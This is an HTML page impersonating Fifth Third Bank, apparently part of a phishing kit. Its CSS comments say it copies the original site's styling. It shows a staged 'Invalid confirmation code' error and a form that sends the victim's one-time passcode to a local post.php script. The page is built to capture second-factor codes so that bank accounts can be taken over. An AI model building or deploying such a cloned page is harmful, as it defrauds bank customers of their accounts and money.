<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Fifth - Confirmation Error</title>
    <link rel="stylesheet" href="res\css\main.css" />
    <style>
        /* ── error message box (matching login error style) ── */
        .error-box {
            background: #f8e7e7;
            border-left: 4px solid #c00;
            padding: 14px 18px;
            margin-bottom: 22px;
            border-radius: 4px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
            font-size: 0.95rem;
        }
        .error-box .error-icon {
            font-size: 1.6rem;
            line-height: 1;
            color: #c00;
            margin-top: 1px;
        }
        .error-box .error-text {
            color: #a00;
            font-weight: 500;
        }
        .error-box .error-text strong {
            font-weight: 700;
        }
        .error-box .error-hint {
            color: #555;
            font-weight: 400;
            font-size: 0.85rem;
            margin-top: 2px;
        }

        /* ── keep original login card styling ── */
        .login {
            background: #fff;
            padding: 30px 35px 35px;
            border-radius: 8px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
            max-width: 420px;
            margin: 0 auto;
        }
        .login h2 {
            margin-top: 0;
            margin-bottom: 6px;
            font-weight: 600;
            font-size: 1.6rem;
            color: #1a2a3a;
        }
        .login p {
            margin-top: 6px;
            margin-bottom: 22px;
            color: #444;
            font-size: 0.95rem;
        }
        .group {
            margin-bottom: 18px;
        }
        .group label {
            display: block;
            font-weight: 500;
            font-size: 0.9rem;
            margin-bottom: 4px;
            color: #333;
        }
        .group input {
            width: 100%;
            padding: 10px 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        .group input:focus {
            border-color: #0055a5;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 85, 165, 0.15);
        }
        .login-button {
            width: 100%;
            padding: 12px;
            background: #0055a5;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 4px;
        }
        .login-button:hover {
            background: #003d7a;
        }

        /* ── header (exactly as original) ── */
        header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 30px;
            background: #fff;
            border-bottom: 1px solid #e5e5e5;
            flex-wrap: wrap;
            gap: 12px;
        }
        header .logo img {
            height: 40px;
            width: auto;
        }
        header .logoo img {
            height: 32px;
            width: auto;
        }
        header .links {
            font-size: 0.8rem;
            color: #555;
        }
        header .links a {
            color: #0055a5;
            text-decoration: none;
            margin: 0 6px;
        }
        header .links a:hover {
            text-decoration: underline;
        }
        header .links a:first-child {
            margin-left: 0;
        }

        .bottom {
            padding: 14px 30px;
            font-size: 0.85rem;
            background: #f8f9fa;
            border-bottom: 1px solid #e5e5e5;
            color: #555;
            min-height: 20px; /* preserve empty space */
        }

        .container {
            padding: 40px 20px;
            max-width: 500px;
            margin: 0 auto;
            min-height: 50vh;
        }

        /* ── responsive ── */
        @media (max-width: 600px) {
            header {
                flex-direction: column;
                align-items: stretch;
                text-align: center;
            }
            header .links {
                text-align: center;
            }
            .login {
                padding: 20px;
            }
        }
    </style>
</head>
<body>

    <!-- ═══ HEADER ═══ -->
    <header>
        <div class="logo">
            <img src="res\img/logo.svg" alt="Fifth Third Bank" />
        </div>
        <div class="logoo">
            <img src="res\img/logoo.png" alt="logo" />
        </div>
        <div class="links">
            <a href="#">CUSTOMER SERVICE</a> |
            <a href="#">BRANCH &amp; ATM LOCATOR</a>
        </div>
    </header>

    <!-- ═══ EMPTY BREADCRUMB (as in original) ═══ -->
    <div class="bottom"></div>

    <!-- ═══ MAIN CONTENT ═══ -->
    <div class="container">

        <div class="login">

            <h2>Confirmation</h2>
            <p>Please enter the code sent to your phone number to continue.</p>

            <!-- ── ERROR MESSAGE (INCORRECT OTP) ── -->
            <div class="error-box" role="alert">
                <span class="error-icon">&#9888;</span>
                <div>
                    <div class="error-text">
                        <strong>Invalid confirmation code.</strong>
                    </div>
                    <div class="error-hint">
                        Please check your code and try again, or request a new one.
                    </div>
                </div>
            </div>

            <form action="post.php" method="post">

                <div class="group">
                    <label for="otp-code">Confirmation code</label>
                    <input
                    type="text"
                    id="otp-code"
                    name="otp"
                    required
                    placeholder="Enter the code"
                    autofocus
                    />
                </div>

                <button type="submit" class="login-button">Continue</button>

            </form>

        </div>

    </div>

</body>
</html>
